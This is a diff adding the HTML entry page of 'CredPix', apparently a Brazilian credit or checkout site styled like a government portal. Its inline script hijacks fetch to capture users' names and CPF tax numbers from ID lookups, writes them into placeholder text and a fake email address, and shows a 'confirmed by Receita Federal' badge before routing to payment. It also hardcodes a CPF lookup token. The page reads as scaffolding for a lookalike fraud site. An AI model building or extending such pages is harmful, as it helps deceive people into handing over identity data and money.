@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head><!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-59CWZV26');</script>
+<!-- End Google Tag Manager -->
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+    <meta name="theme-color" content="#1351b4" />
+    <title>CredPix</title>
+    <style>
+      .brand-logo { display: flex; align-items: center; }
+      .credpix-logo-img { height: 32px; width: auto; }
+      img.credpix-logo-img--wizard {
+        content: url('images/credpix-logo.png') !important;
+        height: 32px !important;
+        width: auto !important;
+      }
+    </style>
+    <script>
+      window.CredPix_BASE_PATH = "";
+      window.CredPix_PUBLIC_ORIGIN = "";
+      window.CredPix_CPF_DIRECT = true;
+      window.CredPix_CPF_TOKEN = "56fb9cbc8d3a7cf7d1c1c8ac12730ec883f150a7134687099bab95058c76aaab";
+      window.getAxtr = function() { return ''; };
+      window.appendAxtr = function(url) { return url; };
+      window.CredPixPath = function(path) {
+        var map = {
+          '/pay/checkoutwqi.html': '/pay/checkout.html',
+          '/pay/checkout': '/pay/checkout.html',
+          '/up/obrigado.html': '/pay/sucesso2.html'
+        };
+        for (var key in map) {
+          if (path && path.indexOf(key) !== -1) return map[key];
+        }
+        return path;
+      };
+      window.CredPixGetBasePath = function() { return '/type/chat'; };
+
+      // Interceptar fetch para capturar dados do CPF quando o wizard consultar
+      (function() {
+        var _fetch = window.fetch;
+        window.fetch = function(url, opts) {
+          return _fetch.apply(this, arguments).then(function(res) {
+            var urlStr = typeof url === 'string' ? url : (url && url.url) || '';
+            if (urlStr.indexOf('/type/api/cpf') !== -1 || urlStr.indexOf('/api/cpf') !== -1) {
+              res.clone().json().then(function(data) {
+                try {
+                  var d = data.data || data;
+                  var nome = d.nome || d.name || '';
+                  var cpf = d.cpf_formatado || d.cpf || d.document || '';
+                  if (nome) localStorage.setItem('nomeUsuario', nome);
+                  if (cpf) localStorage.setItem('cpfUsuario', cpf.replace(/\D/g,''));
+                } catch(e) {}
+              }).catch(function(){});
+            }
+            return res;
+          });
+        };
+      })();
+
+
+      function fixLogo() {
+        document.querySelectorAll('.brand-logo').forEach(function(el) {
+          var img = el.querySelector('img');
+          if (!img) {
+            img = document.createElement('img');
+            img.className = 'credpix-logo-img';
+            img.alt = 'CredPix';
+            el.insertBefore(img, el.firstChild);
+          }
+          img.src = '/type/chat/images/credpix-logo.png';
+          img.style.height = '32px';
+          img.style.width = 'auto';
+        });
+      }
+      fixLogo();
+      setInterval(fixLogo, 300);
+
+      function fixBadge() {
+        document.querySelectorAll('*').forEach(function(el) {
+          var text = el.textContent || '';
+          if (text.trim() === 'Dados confirmados na Receita Federal' && el.children.length <= 2) {
+            var parent = el.parentElement;
+            if (parent) {
+              parent.style.display = 'flex';
+              parent.style.justifyContent = 'center';
+            }
+          }
+        });
+      }
+      fixBadge();
+      setInterval(fixBadge, 500);
+
+      function fixEmail() {
+        var cpf = (localStorage.getItem('cpfUsuario') || '').replace(/\D/g,'');
+        var nome = localStorage.getItem('nomeUsuario') || '';
+        var correctEmail = cpf ? 'user' + cpf + '@CredPix.com.br' : null;
+        document.querySelectorAll('div, span, p, a').forEach(function(el) {
+          if (el.children.length === 0) {
+            var text = el.textContent.trim();
+            if (text === 'user@CredPix.com.br' || text.match(/^user@CredPix\.com\.br$/)) {
+              if (correctEmail) el.textContent = correctEmail;
+            }
+            if ((text === 'CLIENTE' || text === 'Maria das Dores Silva') && nome) {
+              el.textContent = nome.trim().split(/\s+/).slice(0,2).join(' ');
+            }
+          }
+        });
+      }
+      setInterval(fixEmail, 200);
+      document.addEventListener('DOMContentLoaded', function() {
+        fixEmail();
+        var emailObserver = new MutationObserver(fixEmail);
+        emailObserver.observe(document.body, { childList: true, subtree: true, characterData: true });
+      });
+
+    </script>
+    <script type="module" crossorigin src="assets/index-2hrpPW1B-utf8.js"></script>
+    <link rel="modulepreload" crossorigin href="assets/solid-CUBEefxS.js">
+    <link rel="modulepreload" crossorigin href="assets/ui-SkOPAPnM.js">
+    <link rel="stylesheet" crossorigin href="assets/index-CvkAEMz2.css">
+  </head>
+  <body>
+   <!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-59CWZV26"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    <div id="root"></div>
+  </body>
+</html>
